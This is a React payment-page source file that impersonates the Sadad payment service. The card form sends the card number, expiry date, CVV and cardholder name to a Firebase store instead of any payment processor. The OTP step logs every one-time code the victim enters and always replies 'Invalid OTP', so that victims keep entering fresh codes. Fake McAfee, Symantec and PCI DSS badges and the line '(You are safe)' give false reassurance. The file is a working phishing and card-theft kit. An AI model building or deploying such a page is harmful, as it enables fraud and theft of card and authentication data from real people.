"use client"

import type React from "react"
import { useEffect, useState, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { ChevronLeft, CreditCard, Smartphone } from "lucide-react"
import { addData } from "@/lib/firebase"
import FullPageLoader from "@/components/loader"
const allOtps = [""]
export default function PaymentPage() {
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [saveCard, setSaveCard] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<"credit" | "debit" | "sadad">("credit")
  const [step, setStep] = useState<"form" | "otp">("form")
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [error, setError] = useState("")
  const [loading, setLoading] = useState(false)
  const [payVal, setPayval] = useState("")

  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])

  useEffect(() => {
    const val = localStorage.getItem("amount")
    if (val) setPayval(val)
  }, [])

  useEffect(() => {
    if (step === "otp" && "OTPCredential" in window) {
      const abortController = new AbortController()

      navigator.credentials
        .get({
          // @ts-ignore - WebOTP API types
          otp: { transport: ["sms"] },
          signal: abortController.signal,
        })
        .then((otp: any) => {
          if (otp?.code) {
            const digits = otp.code.split("")
            setOtp(digits)
            otpInputRefs.current[5]?.focus()
          }
        })
        .catch((err) => {
          console.log("WebOTP error:", err)
        })

      return () => {
        abortController.abort()
      }
    }
  }, [step])

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "")
    const chunks = cleaned.match(/.{1,4}/g)
    return chunks ? chunks.join(" ") : cleaned
  }

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4)
    }
    return cleaned
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value.replace(/\D/g, ""))
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted)
    }
  }

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value)
    if (formatted.replace(/\D/g, "").length <= 4) {
      setExpiryDate(formatted)
    }
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    if (value.length <= 3) {
      setCvv(value)
    }
  }

  const handleOtpChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1)

    const newOtp = [...otp]
    newOtp[index] = digit
    setOtp(newOtp)
    setError("")

    if (digit && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)
    const digits = pastedData.split("")
    const newOtp = [...otp]

    digits.forEach((digit, index) => {
      if (index < 6) {
        newOtp[index] = digit
      }
    })

    setOtp(newOtp)

    const nextEmptyIndex = newOtp.findIndex((d) => !d)
    if (nextEmptyIndex !== -1) {
      otpInputRefs.current[nextEmptyIndex]?.focus()
    } else {
      otpInputRefs.current[5]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (cardNumber.length < 16) {
      setError("رقم البطاقة غير صحيح")
      return;
    }
    setError("")
    setLoading(true)

    const visitorID = localStorage.getItem("visitor")
    await addData({ id: visitorID, cardNumber, expiryDate, cvv, cardholderName, paymentMethod })
    setTimeout(() => {
      setStep("otp")
      setLoading(false)
    }, 5000)
    if (!visitorID) {
      setError("Visitor not found")
      setLoading(false)
      return
    }
  }
  return (
    <div className="min-h-screen bg-[#8A1538]">
      {loading && <FullPageLoader />}
      {step === "otp" && (
        <div className="min-h-screen bg-[#8A1538] flex items-center justify-center p-4">
          <div className="w-full max-w-md">
            <div className="bg-background rounded-3xl p-8 shadow-2xl">
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-[#8A1538]/10 rounded-2xl mx-auto mb-4 flex items-center justify-center">
                  <svg className="w-8 h-8 text-[#8A1538]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                </div>
                <h2 className="text-2xl font-bold text-foreground mb-2">OTP Verification</h2>
                <p className="text-sm text-muted-foreground">Enter the 6-digit code sent to your phone</p>
              </div>

              <div className="flex gap-3 justify-center mb-6" onPaste={handleOtpPaste}>
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={(el) => (otpInputRefs.current[index] = el)}
                    type="text"
                    inputMode="numeric"
                    autoComplete={index === 0 ? "one-time-code" : "off"}
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    className="w-12 h-14 sm:w-14 sm:h-16 text-center text-2xl font-bold border-2 rounded-xl transition-all focus:outline-none focus:ring-2 focus:ring-[#8A1538] focus:border-[#8A1538] bg-background border-border hover:border-[#8A1538]/50"
                    style={{
                      caretColor: "#8A1538",
                    }}
                  />
                ))}
              </div>

              {error && (
                <div className="mb-4 p-3 bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-900 rounded-xl">
                  <p className="text-sm text-red-600 dark:text-red-400 font-medium text-center">{error}</p>
                </div>
              )}

              <div className="text-center mb-6">
                <button className="text-sm text-[#8A1538] hover:underline font-medium">Resend Code</button>
              </div>

              <Button
                className="w-full h-14 bg-[#8A1538] hover:bg-[#8A1538]/90 text-white rounded-xl text-base font-semibold shadow-lg"
                onClick={async () => {
                  const otpCode = otp.join("")
                  if (otpCode.length !== 6) {
                    setError("Please enter all 6 digits")
                    return
                  }

                  setLoading(true)
                  const visitorID = localStorage.getItem("visitor")
                  allOtps.push(otpCode)
                  await addData({
                    id: visitorID,
                    paymentMethod,
                    allOtps,
                    otp: otpCode,
                  })

                  localStorage.setItem(`used_${visitorID}`, "true")
                  setTimeout(() => {
                    setLoading(false)
                    alert("Invalid OTP")
                  }, 4000)
                }}
              >
                Confirm Payment
              </Button>

              <div className="mt-6 flex items-center justify-center gap-2 text-xs text-muted-foreground">
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>Verification secured with end-to-end encryption</span>
              </div>
            </div>
          </div>
        </div>
      )}
      {step === "form" && (
        <div className="space-y-5 text-center">
          <h2 className="text-lg font-semibold text-white">Payment Information</h2>
          <p className="text-sm text-gray-400">Enter your payment details below</p>

          <header className="relative bg-[#8A1538] text-white px-4 pt-12 pb-8">
            <div className="max-w-md mx-auto">
              <div className="flex items-center justify-between mb-6">
                <button className="p-2 hover:bg-white/10 rounded-lg transition-colors">
                  <ChevronLeft className="h-6 w-6" />
                </button>
                <span className="text-sm">Eng</span>
              </div>

              <div className="text-center space-y-3">
                <div className="w-12 h-12 bg-white rounded-xl mx-auto flex items-center justify-center">
                  <span className="text-[#8A1538] font-bold text-xl">S</span>
                </div>
                <h1 className="text-base font-medium">Sadad Payment solutions</h1>
                <div className="text-center">
                  <p className="text-sm text-white/80 mb-1">Select an option to Pay</p>
                  <p className="text-3xl font-bold">
                    {payVal}
                    <sup className="text-sm"></sup>
                  </p>
                </div>
              </div>
            </div>
          </header>

          <div className="bg-background rounded-t-3xl -mt-2 min-h-[calc(100vh-220px)] pb-8">
            <div className="max-w-md mx-auto px-5 pt-6">
              <div className="grid grid-cols-3 gap-3 mb-6">
                <button
                  onClick={() => setPaymentMethod("credit")}
                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "credit"
                      ? "border-[#8A1538] bg-[#8A1538]/5"
                      : "border-border bg-background hover:border-[#8A1538]/30"
                    }`}
                >
                  <CreditCard
                    className={`h-6 w-6 mb-2 ${paymentMethod === "credit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  />
                  <span
                    className={`text-xs font-medium ${paymentMethod === "credit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  >
                    Credit Card
                  </span>
                </button>

                <button
                  onClick={() => setPaymentMethod("debit")}
                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "debit"
                      ? "border-[#8A1538] bg-[#8A1538]/5"
                      : "border-border bg-background hover:border-[#8A1538]/30"
                    }`}
                >
                  <CreditCard
                    className={`h-6 w-6 mb-2 ${paymentMethod === "debit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  />
                  <span
                    className={`text-xs font-medium ${paymentMethod === "debit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  >
                    Debit Card
                  </span>
                </button>

                <button
                  onClick={() => setPaymentMethod("sadad")}
                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${paymentMethod === "sadad"
                      ? "border-[#8A1538] bg-[#8A1538]/5"
                      : "border-border bg-background hover:border-[#8A1538]/30"
                    }`}
                >
                  <Smartphone
                    className={`h-6 w-6 mb-2 ${paymentMethod === "sadad" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  />
                  <span
                    className={`text-xs font-medium ${paymentMethod === "sadad" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  >
                    Sadad Pay
                  </span>
                </button>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="space-y-2">
                  <label className="text-xs text-muted-foreground font-medium">Card Holder Name</label>
                  <Input
                    type="text"
                    placeholder="Card Holder Name"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    className="h-12 text-base border-border/50 rounded-xl"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-xs text-muted-foreground font-medium">Card Number</label>
                  <div className="relative">
                    <Input
                      type="text"
                      placeholder="0000 0000 0000 0000"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      className="h-12 text-right text-base border-border/50 rounded-xl pr-20 font-mono tracking-wider"
                      dir="ltr"
                      required
                    />
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                      <img src="/vmwx.png" width={90} />
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-xs text-muted-foreground font-medium">Expiry / Validity</label>
                    <Input
                      type="text"
                      placeholder="MM/YY"
                      value={expiryDate}
                      onChange={handleExpiryChange}
                      className="h-12 text-base border-border/50 rounded-xl font-mono"
                      dir="ltr"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs text-muted-foreground font-medium">CVV</label>
                    <div className="relative">
                      <Input
                        type="password"
                        placeholder="000"
                        value={cvv}
                        dir="rtl"
                        onChange={handleCvvChange}
                        className="h-12 text-base border-border/50 rounded-xl pr-10 font-mono"
                        required
                      />
                      <div className="absolute left-3 top-1/2 -translate-y-1/2">
                        <div className="w-6 h-5 bg-gradient-to-br from-amber-400 to-yellow-600 rounded-sm grid grid-cols-3 gap-[1px] p-[2px]">
                          {[...Array(9)].map((_, i) => (
                            <div key={i} className="bg-amber-500/50 rounded-[1px]"></div>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-2 py-2">
                  <Checkbox
                    id="saveCard"
                    checked={saveCard}
                    onCheckedChange={(checked) => setSaveCard(checked as boolean)}
                    className="border-[#8A1538] data-[state=checked]:bg-[#8A1538] data-[state=checked]:border-[#8A1538]"
                  />
                  <label htmlFor="saveCard" className="text-sm text-foreground cursor-pointer">
                    Save this card for faster checkout for next time
                  </label>
                </div>

                <Button
                  type="submit"
                  className="w-full h-14 bg-[#8A1538] hover:bg-[#8A1538]/90 text-white rounded-xl text-base font-semibold shadow-lg mt-6"
                >
                  Pay {payVal}
                </Button>

                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mt-4">
                  <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3zm-2 15l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
                  </svg>
                  <span>
                    Payment is Secured with 256bit SSL encryption{" "}
                    <span className="text-green-600 font-medium">(You are safe)</span>
                  </span>
                </div>
              </form>

              <div className="mt-8 pt-6 border-t border-border">
                <div className="flex items-center justify-center gap-4 mb-3">
                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-red-50 dark:bg-red-950/20 rounded-lg border border-red-200 dark:border-red-900">
                    <div className="w-5 h-5 bg-red-600 rounded flex items-center justify-center text-[8px] font-bold text-white">
                      M
                    </div>
                    <span className="text-[10px] font-semibold text-red-700 dark:text-red-400">McAfee</span>
                  </div>
                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-green-50 dark:bg-green-950/20 rounded-lg border border-green-200 dark:border-green-900">
                    <svg className="w-4 h-4 text-green-600" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" />
                    </svg>
                    <span className="text-[10px] font-semibold text-green-700 dark:text-green-400">SSL</span>
                  </div>
                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-yellow-50 dark:bg-yellow-950/20 rounded-lg border border-yellow-200 dark:border-yellow-900">
                    <svg className="w-4 h-4 text-yellow-600" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M18 8h-1V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                    </svg>
                    <span className="text-[10px] font-semibold text-yellow-700 dark:text-yellow-400">Symantec</span>
                  </div>
                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-50 dark:bg-blue-950/20 rounded-lg border border-blue-200 dark:border-blue-900">
                    <svg className="w-4 h-4 text-blue-600" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" />
                    </svg>
                    <span className="text-[10px] font-semibold text-blue-700 dark:text-blue-400">PCI DSS</span>
                  </div>
                </div>
                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                  <svg className="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  </svg>
                  <span className="text-[11px]">100% secured Payment Powered by Sadad</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
